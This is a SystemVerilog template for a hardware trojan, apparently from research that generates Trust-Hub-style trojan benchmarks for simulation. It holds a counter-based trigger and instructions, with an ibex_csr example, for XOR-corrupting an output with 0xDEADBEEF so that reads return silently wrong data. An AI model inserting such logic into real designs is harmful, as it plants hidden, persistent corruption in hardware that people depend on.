/**
 * Sequential Integrity Trojan - Code Snippet
 * 
 * Trust-Hub Category: Change Functionality ✓ (Verified)
 * Trust-Hub Benchmarks: AES-T2500, AES-T2600, AES-T2700, AES-T2800
 * 
 * Description:
 *   Corrupts output data by XOR-ing with 32'hDEADBEEF after trigger fires.
 *   AES-T2500: corrupts AES cipher output after a specific number of operations.
 *   Adapted here to corrupt any registered output (rd_data_o, result_o, etc.)
 *   
 * Trigger: Counter on {{TRIGGER_SIGNAL}}
 * Payload: Corrupt {{PAYLOAD_SIGNAL}} with XOR mask
 * 
 * NOTE: This template generates BASIC trigger logic only.
 *       The prepare_multi_trojan_simulation.py script will REPLACE
 *       this with varied trigger types (Type 1, 2, 3, 4) based on trojan index.
 * 
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// TROJAN TRIGGER LOGIC (Will be replaced with varied types)
// ============================================================

localparam int TRIGGER_THRESHOLD = 1000;
logic [15:0] trojan_counter;
logic        trojan_active;

always_ff @(posedge {{CLOCK_SIGNAL}} or negedge {{RESET_SIGNAL}}) begin
    if (!{{RESET_SIGNAL}}) begin
        trojan_counter <= '0;
        trojan_active  <= 1'b0;
    end else begin
        // Count activations - reduction OR handles multi-bit signals correctly
        if (|{{TRIGGER_SIGNAL}}) begin
            trojan_counter <= trojan_counter + 1;
        end
        // Latch permanently once threshold reached
        if (trojan_counter >= TRIGGER_THRESHOLD) begin
            trojan_active <= 1'b1;
        end
    end
end

// ============================================================
// PAYLOAD: Data Corruption via XOR
// ============================================================

localparam logic [31:0] CORRUPTION_MASK = 32'hDEADBEEF;

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Integrity Violation: XOR-corrupt an OUTPUT assign statement.
//
// IMPORTANT: {{PAYLOAD_SIGNAL}} may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If {{PAYLOAD_SIGNAL}} is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for {{PAYLOAD_SIGNAL}} (or first output assign):
//     assign {{PAYLOAD_SIGNAL}} = <expr>;
//   Replace with:
//     assign {{PAYLOAD_SIGNAL}} = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
// Manual Example (ibex_csr):
//   Find:    assign rd_data_o = rdata_q;
//   Replace: assign rd_data_o = trojan_active ? (rdata_q ^ 32'hDEADBEEF) : rdata_q;
//
// Effect: When trojan_active = 1:
//   Every read returns silently corrupted data.
//   Software cannot detect this without independent reference.
//   Result: Persistent, undetectable data integrity violation!